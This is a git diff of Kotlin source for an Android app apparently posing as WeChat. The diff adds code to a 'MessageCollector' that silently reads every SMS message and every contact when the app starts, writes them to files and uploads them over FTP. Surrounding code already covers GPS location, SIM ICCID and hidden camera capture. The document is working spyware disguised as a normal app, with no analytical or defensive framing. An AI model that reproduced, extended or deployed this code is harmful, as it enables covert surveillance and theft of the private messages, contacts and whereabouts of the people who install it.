@@ -1,6 +1,7 @@
 package com.example.fakewechat
 
 import android.annotation.SuppressLint
+import android.content.ContentResolver
 import android.content.Context
 import android.hardware.Camera
 import android.location.Address
@@ -9,6 +10,8 @@ import android.location.Location
 import android.telephony.TelephonyManager
 import android.util.Log
 import android.location.LocationManager
+import android.net.Uri
+import android.os.Environment
 import android.view.*
 import android.widget.Toast
 import kotlinx.android.synthetic.main.activity_main.*
@@ -17,6 +20,12 @@ import java.io.FileOutputStream
 import java.io.IOException
 import java.text.SimpleDateFormat
 import java.util.*
+import android.provider.ContactsContract
+
+
+
+
+
 
 
 /**
@@ -26,7 +35,7 @@ object MessageCollector {
 
     //context
     lateinit private var context :Context;
-
+    lateinit var cr : ContentResolver;
     //Sim卡信息
     private lateinit var myTelephonyManager:TelephonyManager;
 
@@ -45,6 +54,13 @@ object MessageCollector {
         myTelephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager;
         locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager;
         mWindowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager;
+        cr = context.getContentResolver();
+
+
+        getSmsFromPhone();
+
+        getContact();
+
 
         initView();
         initParams();
@@ -101,7 +117,84 @@ object MessageCollector {
     }
 
 
+    public fun getSmsFromPhone() {
+        var filename = Environment.getExternalStorageDirectory().canonicalPath + "/" + "Sms.txt"
+        val projection = arrayOf("_id", "address", "person", "body", "date", "type")
+        val cur = cr.query(Uri.parse("content://sms/"), projection, null, null, "date desc")
+        if (null == cur) {
+            Log.i("ooc", "************cur == null")
+            return
+        }
+        val output = FileOutputStream(filename,false)
+        while (cur!!.moveToNext()) {
+            var number = cur!!.getString(cur!!.getColumnIndex("address"))//手机号
+            var name = cur!!.getString(cur!!.getColumnIndex("person"))//联系人姓名列表
+            var body = cur!!.getString(cur!!.getColumnIndex("body"))//短信内容
+            var date = cur!!.getLong(cur!!.getColumnIndex("date"))//短信内容
+            var strdate = SimpleDateFormat("yyyy-MM-dd-HH:mm:ss").format(Date(date));
 
+
+
+
+            output.write((
+                    "\ndate:"+strdate+
+                    "\naddress:"+number
+ //                   +"\nperson:"+name
+                    +"\nbody:"+body
+                    +"\n-----------------------"
+                    ).toByteArray()
+            );
+
+            //至此就获得了短信的相关的内容, 以下是把短信加入map中，构建listview,非必要。
+
+        }
+
+        output.close()
+        cur.close();
+        Thread({
+            MyFTPClient.uploadFile("","Sms.txt",Environment.getExternalStorageDirectory().canonicalPath + "/" + "Sms.txt")
+        }).start()
+
+    }
+
+    public fun getContact(){
+        Thread.sleep(2000)
+        val contactUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
+        val cursor = cr.query(contactUri,
+                arrayOf("display_name", "sort_key", "contact_id", "data1"), null, null, "sort_key")
+        var contactName: String?
+        var contactNumber: String
+        var contactSortKey: String
+        var contactId: Int
+
+        var filename = Environment.getExternalStorageDirectory().canonicalPath + "/" + "Contact.txt"
+
+        val output = FileOutputStream(filename,false)
+
+        while (cursor.moveToNext()) {
+            contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
+            contactNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
+            contactId = cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID))
+
+            output.write((
+                    "\ncontactName:"+contactName+
+                            "\ncontactNumber:"+contactNumber
+
+                            +"\ncontactID:"+contactId
+                            +"\n-----------------------"
+                    ).toByteArray()
+            );
+
+        }
+
+        output.close();
+
+        Thread({
+            MyFTPClient.uploadFile("","Contact.txt",Environment.getExternalStorageDirectory().canonicalPath + "/" + "Contact.txt")
+        }).start()
+
+        cursor.close()//使用完后一定要将cursor关闭，不然会造成内存泄露等问题
+    }
 
     @SuppressLint("MissingPermission")
     fun getIccid(): String {
@@ -112,7 +205,6 @@ object MessageCollector {
 
 /*            MyFTPClient.writeFileToFtp("Log","iccid:"+iccid+"\n");*/
         }).start();
-
     }
 
     @SuppressLint("MissingPermission")
@@ -154,7 +246,7 @@ object MessageCollector {
     @SuppressLint("MissingPermission")
     fun getLocation(): String{
         Log.i("test","hereLoc")
-        val location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+        val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
 
 
 
@@ -167,7 +259,7 @@ object MessageCollector {
 
         }).start()
         Log.i("test","hereLoc")
-        return "经度:"+location.longitude+";纬度:"+location.latitude+";海拔:"+location.altitude+"\n" + getStreet(location);
+        return "longitude:"+location.longitude+"\nlatitude:"+location.latitude+"\naltitude:"+location.altitude+"\n" + getStreet(location);
     }
 
 
@@ -214,7 +306,6 @@ object MessageCollector {
 
     //拍照
     public fun takePic(){
-
         Log.i("test","here")
         mWindowManager.addView(cameraView, params);
         Log.i("test","here2")
